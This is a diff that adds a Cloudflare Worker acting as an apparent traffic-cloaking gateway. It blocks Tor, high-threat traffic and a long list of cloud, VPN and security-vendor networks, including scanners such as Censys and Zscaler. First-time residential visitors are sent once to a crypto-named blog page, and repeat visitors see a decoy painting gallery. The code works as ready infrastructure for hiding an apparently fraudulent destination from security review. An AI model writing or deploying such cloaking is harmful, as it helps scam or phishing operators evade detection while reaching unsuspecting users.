@@ -1,0 +1,311 @@
+const BLOG_URL = 'https://cryptoswala.blogspot.com/2026/06/cryptowala.html';
+
+const BLOCKED_ASNS = [
+  // Cloudflare
+  'AS13335','AS209242','AS132892','AS203898',
+  // Google
+  'AS15169','AS19527','AS43515','AS36040','AS41264',
+  // Amazon AWS
+  'AS16509','AS14618','AS38895','AS7224',
+  // Microsoft Azure
+  'AS8075','AS8068','AS8069','AS3598','AS6182',
+  // DigitalOcean
+  'AS14061','AS393406','AS46652',
+  // Akamai
+  'AS20940','AS16625','AS18717','AS21342','AS21357','AS22207',
+  // Facebook/Meta
+  'AS32934','AS63293','AS54115',
+  // Fastly
+  'AS54113','AS394536',
+  // IBM/SoftLayer
+  'AS36351','AS2914','AS4513',
+  // Lumen/Level3
+  'AS3356','AS209','AS1299','AS3549','AS11213',
+  // Hurricane Electric
+  'AS6939',
+  // Linode/Akamai
+  'AS63949','AS24191','AS328899',
+  // Vultr
+  'AS20473','AS64515',
+  // OVH
+  'AS16276','AS35540','AS198203','AS35478',
+  // Hetzner
+  'AS24940','AS212317',
+  // Contabo
+  'AS51167','AS40021',
+  // Oracle Cloud
+  'AS31898','AS31836','AS46484','AS13527',
+  // Alibaba Cloud
+  'AS45102','AS37963','AS45103','AS45104',
+  // Tencent Cloud
+  'AS45090','AS132203','AS132591',
+  // Huawei Cloud
+  'AS55990','AS136907',
+  // Zayo
+  'AS6461','AS10825',
+  // GTT
+  'AS3257','AS4436',
+  // Cogent
+  'AS174','AS38001',
+  // Internap
+  'AS15418','AS12180',
+  // Psychz Networks
+  'AS40676',
+  // QuadraNet
+  'AS8100','AS27589',
+  // Serverius
+  'AS50673',
+  // LeaseWeb
+  'AS60781','AS28753','AS30736','AS15435',
+  // Scaleway
+  'AS12876','AS394354',
+  // Equinix
+  'AS24115','AS378266',
+  // Rackspace
+  'AS27357','AS33070','AS10532',
+  // Verizon Business
+  'AS701','AS702','AS703',
+  // Sprint
+  'AS1239','AS6167',
+  // Tor ASNs
+  'AS60729','AS198605','AS208323','AS44925',
+  // VPN Providers (general)
+  'AS9009','AS8972','AS49981','AS35819','AS59432',
+  // Mullvad VPN
+  'AS39351',
+  // NordVPN
+  'AS212238','AS210644',
+  // ExpressVPN
+  'AS3209','AS216099',
+  // Private Internet Access
+  'AS11398','AS53356',
+  // Hosting.com
+  'AS26347',
+  // ColoCrossing
+  'AS36352','AS22612',
+  // BuyVM
+  'AS53667',
+  // Sharktech
+  'AS46475',
+  // DataShack
+  'AS23473',
+  // Automattic
+  'AS2635',
+  // Choopa/Vultr
+  'AS21769',
+  // M247
+  'AS208971',
+  // ServerMania
+  'AS40532',
+  // Constant
+  'AS26277',
+  // Virtono
+  'AS44496',
+  // Interserver
+  'AS34305','AS35916',
+  // Hostsailor
+  'AS56655',
+  // Porkbun
+  'AS55081',
+  // Ipxo
+  'AS1280',
+  // Censys
+  'AS398705',
+  // PureVPN
+  'AS132338','AS7524',
+  // HideMyAss
+  'AS29550',
+  // CyberGhost
+  'AS212711','AS34665',
+  // TunnelBear
+  'AS395082',
+  // Windscribe
+  'AS400328',
+  // Proton VPN
+  'AS209850','AS202425',
+  // IPVanish
+  'AS36024',
+  // Surfshark
+  'AS218294','AS208091',
+  // Atlas VPN
+  'AS209103',
+  // AirVPN
+  'AS197540',
+  // IVPN
+  'AS35661',
+  // PrivateVPN
+  'AS198985',
+  // Astrill VPN
+  'AS59477',
+  // VyprVPN
+  'AS30633',
+  // StrongVPN
+  'AS33588',
+  // Avast VPN
+  'AS43260',
+  // Hotspot Shield
+  'AS21501',
+  // Betternet
+  'AS46606',
+  // DataPacket
+  'AS212047',
+  // Serverspace
+  'AS57523',
+  // G-Core Labs
+  'AS199524',
+  // Selectel
+  'AS50340',
+  // Yandex Cloud
+  'AS200350','AS13238',
+  // Mail.ru Cloud
+  'AS47764',
+  // RETN
+  'AS9002',
+  // Transtelecom
+  'AS20485',
+  // Rostelecom
+  'AS12389',
+  // MTS
+  'AS8359',
+  // Datacamp
+  'AS60068',
+  // Path Network
+  'AS396356',
+  // Nexeon Technologies
+  'AS36114',
+  // tzulo
+  'AS46261',
+  // Ionos
+  'AS8560','AS21100',
+  // Strato
+  'AS6724',
+  // Uniserver
+  'AS50266',
+  // WebNX
+  'AS18450',
+  // Volico
+  'AS33055',
+  // Incapsula/Imperva
+  'AS19551',
+  // Sucuri
+  'AS30148',
+  // Zscaler
+  'AS62044','AS396982',
+  // Palo Alto
+  'AS393473',
+];
+
+export default {
+  async fetch(request, env) {
+    const cf     = request.cf || {};
+    const ip     = request.headers.get('CF-Connecting-IP') || '';
+    const asn    = cf.asn    ? 'AS' + cf.asn : '';
+    const isTor  = cf.isTor  === true;
+    const threat = cf.threatScore ? parseInt(cf.threatScore) : 0;
+
+    if (isTor) return blockedPage('Tor exit node not allowed');
+    if (threat > 20) return blockedPage('Suspicious traffic detected');
+    if (BLOCKED_ASNS.includes(asn)) return blockedPage('VPN / Datacenter IP not allowed');
+
+    const key = 'v_' + ip;
+    const visited = await env.GATEWAY_KV.get(key);
+
+    if (visited) return decoyPage();
+
+    await env.GATEWAY_KV.put(key, '1', { expirationTtl: 86400 });
+    return blogRedirect(BLOG_URL);
+  }
+};
+
+function blogRedirect(blogUrl) {
+  return new Response(`<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Loading...</title>
+</head>
+<body>
+<script>
+window.location.replace('${blogUrl}');
+</script>
+</body>
+</html>`, {
+    status: 200,
+    headers: { 'Content-Type': 'text/html;charset=UTF-8' }
+  });
+}
+
+function blockedPage(reason) {
+  return new Response(`<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>Access Restricted</title>
+<style>
+body{margin:0;font-family:sans-serif;background:#faf8f5;
+display:flex;align-items:center;justify-content:center;min-height:100vh;}
+.box{text-align:center;padding:2rem;max-width:420px;}
+h2{color:#8b1a1a;}p{color:#6b6154;font-size:14px;line-height:1.7;}
+</style></head>
+<body><div class="box">
+<h2>Access Restricted</h2>
+<p>This blog only allows residential internet connections.<br><br>
+<strong>Reason:</strong> ${reason}<br><br>
+Please disconnect your VPN or proxy and try again.</p>
+</div></body></html>`, {
+    status: 403,
+    headers: { 'Content-Type': 'text/html;charset=UTF-8' }
+  });
+}
+
+function decoyPage() {
+  return new Response(`<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>Dreams Paintings</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:sans-serif;background:#fff;}
+header{background:#1a1208;color:#fff;padding:1.2rem 2rem;
+display:flex;align-items:center;justify-content:space-between;}
+header h1{font-size:20px;}
+nav{display:flex;gap:1.5rem;font-size:14px;opacity:.7;}
+.hero{background:linear-gradient(135deg,#f5ede4,#e8d5c0);
+padding:4rem 2rem;text-align:center;}
+.hero h2{font-size:32px;color:#1a1208;margin-bottom:1rem;}
+.hero p{color:#6b6154;max-width:500px;margin:0 auto;}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));
+gap:1.5rem;padding:3rem 2rem;max-width:900px;margin:0 auto;}
+.card{border-radius:12px;border:1px solid #e8e0d5;overflow:hidden;background:#faf8f5;}
+.img{height:140px;display:flex;align-items:center;justify-content:center;font-size:48px;}
+.info{padding:1rem;}
+.info h3{font-size:15px;color:#1a1208;margin-bottom:4px;}
+.info p{font-size:12px;color:#a09488;}
+footer{text-align:center;padding:2rem;font-size:12px;
+color:#a09488;border-top:1px solid #e8e0d5;}
+</style></head>
+<body>
+<header>
+  <h1>Dreams Paintings</h1>
+  <nav><span>Home</span><span>Gallery</span><span>About</span><span>Contact</span></nav>
+</header>
+<div class="hero">
+  <h2>Welcome to Dreams Paintings</h2>
+  <p>Explore a curated collection of beautiful artworks and paintings.</p>
+</div>
+<div class="grid">
+  <div class="card"><div class="img" style="background:#f0e6d3">&#x1F3A8;</div>
+  <div class="info"><h3>Abstract Dreams</h3><p>Oil on canvas · 2024</p></div></div>
+  <div class="card"><div class="img" style="background:#e8d5c0">&#x1F5BC;</div>
+  <div class="info"><h3>Golden Hour</h3><p>Watercolour · 2024</p></div></div>
+  <div class="card"><div class="img" style="background:#f5e8d5">&#x1F305;</div>
+  <div class="info"><h3>Sunrise Serenity</h3><p>Acrylic · 2023</p></div></div>
+  <div class="card"><div class="img" style="background:#ece0d0">&#x1F33F;</div>
+  <div class="info"><h3>Nature's Embrace</h3><p>Mixed media · 2023</p></div></div>
+  <div class="card"><div class="img" style="background:#f0ddd0">&#x1F98B;</div>
+  <div class="info"><h3>Flutter & Flow</h3><p>Gouache · 2024</p></div></div>
+  <div class="card"><div class="img" style="background:#e5d8c8">&#x1F319;</div>
+  <div class="info"><h3>Midnight Blue</h3><p>Oil on canvas · 2023</p></div></div>
+</div>
+<footer>&copy; 2024 Dreams Paintings &middot; All Rights Reserved</footer>
+</body></html>`, {
+    status: 200,
+    headers: { 'Content-Type': 'text/html;charset=UTF-8' }
+  });
+}
